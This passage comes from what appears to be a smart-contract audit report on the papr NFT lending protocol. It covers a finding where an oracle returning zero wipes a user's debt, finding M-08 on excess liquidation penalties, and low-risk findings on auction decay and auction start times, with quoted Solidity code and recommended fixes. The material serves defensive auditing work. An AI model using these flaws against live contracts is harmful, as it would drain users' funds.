class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">291</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">/// there will be debt left with no NFTs, set it to 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">292</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_reduceDebtWithoutBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">293</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the line 273 as below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"soliditiy\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">bool isLastCollateral = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count == 0;</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1370075373\">wilsoncusack (Backed) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Not sure if this was flagged in other issues but the outcome of this is significant: if we incorrectly think that it is a user’s last NFT, then we will set their debt to 0. If they did in fact have other NFTs in, then they can withdraw these for free!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374537725\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The impact of <code>underwritePriceForCollateral()</code> returning 0 when <code>count != 0</code> is clear. However, user has not specified a single plausible reason as to how the oracle could return 0. From my knowledge, it should not be possible with standard oracles, and therefore the finding can at most be treated as a Low level find.\nMedium severity should clearly define hypotheticals, which are missing in the above report.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374573062\">hansfriese (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@trust1995 Please note that it is possible for the Reservoir oracle (that is used in this protocol) to return zero price.</p>\n<p>I tried their <a href=\"https://docs.reservoir.tools/reference/getoraclecollectionscollectionflooraskv1\">test suite</a> using a collection 0x495f947276749Ce646f68AC8c248420045cb7b5e.</p>\n<p>From the protocol’s viewpoint, Reservoir is still an external dependency and I think no assumptions should be made about it.</p>\n<p>I reached out to the Reservoir protocol dev team regarding this and got a reply as below.</p>\n<p><img src=\"https://user-images.githubusercontent.com/45533148/211182410-db128844-3791-4bd6-9418-fbf6e9656dc0.png\" alt=\"screenshot_48\"></p>\n<p>After all, the Reservoir team also warns that it is not safe to assume their return price can not be zero.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/216#issuecomment-1374787813\">trust1995 (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After deliberating on the decision with another judge, believe it is best to give warden the benefit of the doubt regarding hypotheticals surrounding zero return value. Will award Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-user-fund-loss-because-function-purchaseliquidationauctionnft-takes-extra-liquidation-penalty-when-users-last-collateral-is-liquidated-set-wrong-value-for-maxdebtcached-when-islastcollateral-is-true\" style=\"position:relative;\"><a href=\"#m-08-user-fund-loss-because-function-purchaseliquidationauctionnft-takes-extra-liquidation-penalty-when-users-last-collateral-is-liquidated-set-wrong-value-for-maxdebtcached-when-islastcollateral-is-true\" aria-label=\"m 08 user fund loss because function purchaseliquidationauctionnft takes extra liquidation penalty when users last collateral is liquidated set wrong value for maxdebtcached when islastcollateral is true permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/255\">[M-08] User fund loss because function <code>purchaseLiquidationAuctionNFT()</code> takes extra liquidation penalty when user’s last collateral is liquidated, (set wrong value for <code>maxDebtCached</code> when <code>isLastCollateral</code> is true)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/255\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/217\">hansfriese</a></em></p>\n<p>Function <code>purchaseLiquidationAuctionNFT()</code> purchases a liquidation auction with the controller’s papr token. The liquidator pays the papr amount which is equal to price of the auction and receives the auctioned  NFT. Contract would transfer paid papr and pay borrower debt and if there is extra papr left, it would be transferred to the user. </p>\n<p>For extra papr that is not required for brining user debt under max debt, contract gets liquidation penalty but in some cases (when the auctioned NFT is user’s last collateral) contract take penalty from all of the transferred papr and not just the extra. So users would lose funds in those situations because of this and the fund could be big because the penalty is 10% of the price of the auction and in most cases user would lose 10% of his debt (the value of the NFT).</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>purchaseLiquidationAuctionNFT()</code> code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function purchaseLiquidationAuctionNFT(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Auction calldata auction,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 maxPrice,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address sendTo,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 collateralValueCached = underwritePriceForCollateral(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            auction.auctionAssetContract, ReservoirOracleUnderwriter.PriceKind.TWAP, oracleInfo</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) * _vaultInfo[auction.nftOwner][auction.auctionAssetContract].count;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bool isLastCollateral = collateralValueCached == 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 debtCached = _vaultInfo[auction.nftOwner][auction.auctionAssetContract].debt;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /// anything above what is needed to bring this vault under maxDebt is considered excess</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 neededToSaveVault = maxDebtCached &gt; debtCached ? 0 : debtCached - maxDebtCached;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 price = _purchaseNFTAndUpdateVaultIfNeeded(auction, maxPrice, sendTo);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 excess = price &gt; neededToSaveVault ? price - neededToSaveVault : 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 remaining;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (excess &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), price);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            remaining = debtCached - price;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (isLastCollateral &amp;&amp; remaining != 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            /// there will be debt left with no NFTs, set it to 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>As you can see when <code>collateralValueCached</code> is 0 and user has no more collaterals left then the value of <code>isLastCollateral</code> set as true. And when <code>isLastCollateral</code> is true the value of <code>maxDebtCached</code> set as <code>debtCached</code> (line <code>maxDebtCached = isLastCollateral ? debtCached : _maxDebt(collateralValueCached, updateTarget());</code>) and the value of the <code>neededToSaveVault</code> would be 0 (line <code>neededToSaveVault = maxDebtCached > debtCached ? 0 : debtCached - maxDebtCached</code>) and the <code>excess</code> would be equal to <code>price</code> (in the line <code>excess = price > neededToSaveVault ? price - neededToSaveVault : 0</code>) so all the papr paid by liquidator would be considered as excess and the contract would get liquidation penalty out of that. So in the current implementation in last collateral liquidation all of the paid papr by liquidator would be considered excess:</p>\n<ol>\n<li>uUer has no NFT left.</li>\n<li>debtCached is 100.</li>\n<li>collateralValueCached  is 0 and isLastCollateral is true.</li>\n<li>maxDebtCached would be as debtCached which is 100.</li>\n<li>neededToSaveVault would be debtCached - maxDebtCached which is 0.</li>\n<li>excess would equal to price and code would take penalty out of all the price amount.</li>\n</ol>\n<p>Code wants to take penalty from what borrower is going to receive (other than the required amount for extra debt), but in the current implementation when it is last NFT code took fee from all of the payment. These are the steps that show how the issue would harm the borrower and borrower would lose funds: (of course user debt would be set to 0 in the end, but if price was higher than user debt user won’t receive the extra amount).</p>\n<ol>\n<li>User debt is 900 and price of auction is 1000 and user has no NFT left.</li>\n<li>Some one pays 1000 Papr and buys the auctioned token, now user would receive 0 amount because the penalty would be 1000 * 10% = 100 and the debt is 900.</li>\n<li>But penalty should be (1000-900) * 10% = 10 and user should have received 90 token.</li>\n</ol>\n<p>So users would receive less amount when their last NFT is liquidated and the price is higher than debt. Users would lose 10% of their entitled fund. Most users can use one token as collateral so the bug can happen most of the time.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The code should be like this:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 maxDebtCached = isLastCollateral ? 0: _maxDebt(collateralValueCached, updateTarget());</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/255\">wilsoncusack (Backed) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/255\">trust1995 (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 34 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/147\">report highlighted below</a> by <strong>yixxas</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/292\">Breeje</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/283\">gz627</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/279\">ak1</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/268\">Franfran</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/267\">wait</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/259\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/256\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/248\">SaharDevep</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/237\">lukris02</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/234\">bin2chen</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/224\">tnevler</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/219\">Diana</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/205\">imare</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/197\">Jeiwan</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/191\">unforgiven</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/181\">HE1M</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/172\">HollaDieWaldfee</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/171\">brgltd</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/150\">shark</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/133\">SmartSek</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/125\">IllIllI</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/120\">0x52</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/118\">0xAgro</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/109\">chrisdior4</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/99\">rvierdiiev</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/94\">Secureverse</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/76\">RaymondFam</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/67\">Bobface</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/66\">ladboy233</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/48\">Bnke0x0</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/45\">oyc_109</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/12\">Rolezn</a>, and\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/5\">0xhacksmithh</a>\n.</em></p>\n<h2 id=\"l-01-current-decay-percentage-could-be-too-high\" style=\"position:relative;\"><a href=\"#l-01-current-decay-percentage-could-be-too-high\" aria-label=\"l 01 current decay percentage could be too high permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Current decay percentage could be too high</h2>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L44-L47\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L44-L47</a></p>\n<p>Currently, we have a decay per period of 70% and a period of 1 day. This means that every day, price drop will be 70%. While I understand that the protocol strives for an exponential decay dutch auction format, with the current numbers, price of NFT will quickly be negligible.</p>\n<p>An example of how quickly the price can drop.</p>\n<p>Day 0: 1000\nDay 1: 300\nDay 2: 90\nDay 3: 27</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>One recommendation is to reduce this amount to a more reasonable 30-50%. It still maintains the property of exponential decrease, but at a slower pace.</p>\n<h2 id=\"l-02-latestauctionstarttime-can-be-wrongly-set-to-0-even-if-an-nft-is-still-selling-in-auction\" style=\"position:relative;\"><a href=\"#l-02-latestauctionstarttime-can-be-wrongly-set-to-0-even-if-an-nft-is-still-selling-in-auction\" aria-label=\"l 02 latestauctionstarttime can be wrongly set to 0 even if an nft is still selling in auction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] <code>latestAuctionStartTime</code> can be wrongly set to 0 even if an NFT is still selling in auction</h2>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519-L530\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519-L530</a></p>\n<p>This issue can happen when multiple collaterals are sent for auction. The vulnerability can happen due to <code>_purchaseNFTAndUpdateVaultIfNeeded()</code>.</p>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519-L530\">PaprController.sol#L519-L530</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_purchaseNFTAndUpdateVaultIfNeeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sendTo</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">_purchaseNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maxPrice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sendTo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">latestAuctionStartTime</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nftOwner</span><span class=\"mtk1\">][</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionAssetContract</span><span class=\"mtk1\">].</span><span class=\"mtk12\">latestAuctionStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We note how <code>_vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime</code> is set to 0 when <code>startTime == _vaultInfo[auction.nftOwner][auction.auctionAssetContract].latestAuctionStartTime</code>.</p>\n<p>It is documented that when <code>latestAuctionStartTime == 0</code>, no auction is being held but this is not true.</p>\n<p>2 collaterals from a user can be sent to an auction, but the later one gets purchased first. This would set the <code>vault.latestAuctionStartTime</code> to 0 even though the first auction is still running. This can lead to potential problems in the future if we rely on this value.</p>\n<h3 id=\"recommendation-1\" style=\"position:relative;\"><a href=\"#recommendation-1\" aria-label=\"recommendation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>It might be a good idea to restrict only one collateral to be sent to the auction at a time. Another high severity issue arises due to this as I have written in my other report.</p>\n<h2 